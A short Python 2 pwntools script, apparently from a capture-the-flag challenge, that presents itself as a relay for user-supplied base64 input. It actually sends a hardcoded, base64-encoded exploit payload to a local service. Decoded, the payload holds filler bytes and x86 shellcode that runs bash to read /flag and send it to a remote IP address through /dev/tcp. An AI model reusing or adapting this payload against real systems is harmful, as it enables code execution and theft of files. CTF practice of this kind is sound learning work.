import pwn
import sys
from time import sleep
from hashlib import sha256
from base64 import b64decode
from requests import get
pwn.context.log_level='critical'

pwn_ip='127.0.0.1'

def pwnIO():
    print "Hello, This is very simple python script.\nIt only can receive your base64 strings and b64decode and send to pwn program...\nBy the way, flag in /flag\nSo, please give me a base64 strings:"
    sys.stdout.flush()
    strings="MQo1MgpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBMwowCkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUExCjQ0CkEKMQo0NApBCjEKNjAKQQoxCjQ0CkEKMwowCkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUGhCjIKMQoxCjQ0CkEKMQo0NApBCjEKNjAKQQoyCjUKMwoyCkEAAABBQUFBQUFBQUFBQUFBCjEKNDQKQQoyCjYKMwozCjSlDghBQUFBQUEKMQo2MApBCjEKNjAKAAAAAAAAAAAAAAAAAAAAAAAAAAC4pA4ICjEKMjUyCkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQdykDghqAGgvc2gAaC9iaW5oLWMAAGoAaDAwMCdoMDAvMWgzNy4xaDYwLjFoMDguMWhjcC8xaGV2L3RoPiAvZGhsYWcgaHQgL2ZoICdjYWhoIC1jaCBiYXONXCQ4jUwkPI0UJGoAUlNRjQwkaC9zaABoL2Jpbo0cJLgLAAAAugAAAADNgAoxCjEwCg=="
    try:
        payload=b64decode(strings)
    except:
        print 'This not base64 strings\nExit...'
        sys.exit(0)
    p=pwn.remote(pwn_ip,8888)
    p.sendline(payload)
    sleep(1)
    return p.recv()

try:
    pwnIO()
except:
	pass
print "Exit..."

#sys.exit(0)
